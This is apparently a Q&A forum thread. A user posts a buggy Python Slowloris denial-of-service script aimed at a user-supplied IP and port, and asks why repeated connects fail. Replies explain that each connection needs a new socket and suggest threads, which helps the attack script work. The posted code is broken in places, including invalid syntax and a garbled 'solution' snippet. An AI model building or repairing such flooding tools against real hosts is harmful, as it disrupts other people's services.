<div class="post-text" itemprop="text">
<p>i have this error within python socket</p>
<p>my aim is to create a slow lorris attack but i am having problems with getting multi connections to my router within the one program</p>
<p>i want to get the amount of sockets within a list to call</p>
<pre><code>import socket
import time
import os
import random

socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]

def clear():
    os.system("cls")

print("Starting...")
print("press enter to start")
agreement = input("")

port = 445
port_s = str(port)
socket.settimeout(4)


list_of_sockets = []

import socket
servers = [] #add servers here
if agreement == "":
    clear()
    print("")


    print("welcome...")
    target = input("ip target&gt;&gt;&gt;")
    print("defult port is " + port_s)
    print("-" * 10 + " START " + "-" * 10)
    print("")
    def connect_to():
        int_nob = int(200)#num of bots
        for x in range(0, int_nob):
            print(int(int_nob))
            int_nob -= 1
            int_nob = socket.connect((target, port))
            int_nob.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
            client = new Client()
            if int_nob == 0:
                print(list_of_sockets)
                print("resending sockets of " + int_nob)
    while True:
        connect_to()
    else:
        print("breaking...")
        exit()
</code></pre>
<p>error</p>
<pre><code>Traceback (most recent call last):
  File "C:\Users\townte23\Desktop\slow lorris,.py", line 78, in &lt;module&gt;
    connect_to()
  File "C:\Users\townte23\Desktop\slow lorris,.py", line 71, in connect_to
    a = socket.connect((target, port))
OSError: [WinError 10056] A connect request was made on an already connected socket
</code></pre>
<p>I did cannibalize someone elses code but most of it is mine
<a href="https://github.com/gkbrk/slowloris/blob/master/slowloris.py" rel="nofollow noreferrer">https://github.com/gkbrk/slowloris/blob/master/slowloris.py</a></p>
<p>i did find a simmilar issue but it was a server issue so im not sure how to approach this error</p>
<p>edit: found the problem and the solution</p>
<pre><code>int_nob = int(200)
for
     int_nob = socket.connect(())
     int_nob.send(bytes("thing"))
     int_nob -= 1
</code></pre>
</div>
<div class="post-text" itemprop="text">
<pre><code>socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
...
    def connect_to():
        ...
        for x in range(0, int_nob):
            ...
            a = socket.connect((target, port))
            ...
    while True:
        connect_to()
</code></pre>
<p>You cannot do multiple connects with the same socket but you have to create a new socket for each new connection. Apart from that it is very confusing that you call your socket simply <code>socket</code> since this conflicts in name with the module <code>socket</code> you import.</p>
</div>
<span class="comment-copy">how would i create a different variable for every socket within a for loop?</span>
<span class="comment-copy">@anunexpectedperson:  You don't need a different variable. But you need to create a new socket for each connect, i.e. <code>c = socket.socket(....)... c.connect(...)</code></span>
<span class="comment-copy">but how would i implement that into a loop for the connections</span>
<span class="comment-copy">@anunexpectedperson you will probably have to create each socket as a separate non blocking threads (each time you run connect_to, generate a new thread).  You may end up exceeding the thread limit though... unless you can get the threads closed fast enough and their reference counts to 0</span>
<span class="comment-copy">One other issue is that the sockets don't usually become re-useable until the entire python scrip closes.</span>
